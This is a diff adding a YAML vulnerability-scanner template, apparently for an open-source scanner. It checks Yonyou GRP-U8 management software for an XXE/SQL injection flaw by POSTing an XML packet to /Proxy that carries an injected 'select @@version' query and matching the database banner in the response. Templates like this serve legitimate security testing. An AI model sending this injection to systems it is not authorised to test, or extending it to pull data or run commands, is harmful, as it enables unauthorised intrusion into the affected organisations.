@@ -1,0 +1,21 @@
+id: yonyou-grp-u8-proxy-xxe-sqli
+
+info:
+  name: 用友 GRP-U8 Proxy XXE-SQL注入漏洞
+  author: zan8in
+  severity: high
+  description: |
+    用友GRP-u8存在XXE漏洞，该漏洞源于应用程序解析XML输入时没有进制外部实体的加载，导致可加载外部SQL语句，以及命令执行
+    title="用友GRP-U8行政事业内控管理软件"
+  tags: yonyou,xxe,sqli
+  created: 2020/09/11
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /Proxy
+      body: |
+        cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format="text">select @@version</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
+    expression: response.status == 200 && response.body.bcontains(b'Microsoft SQL Server')
+expression: r0()
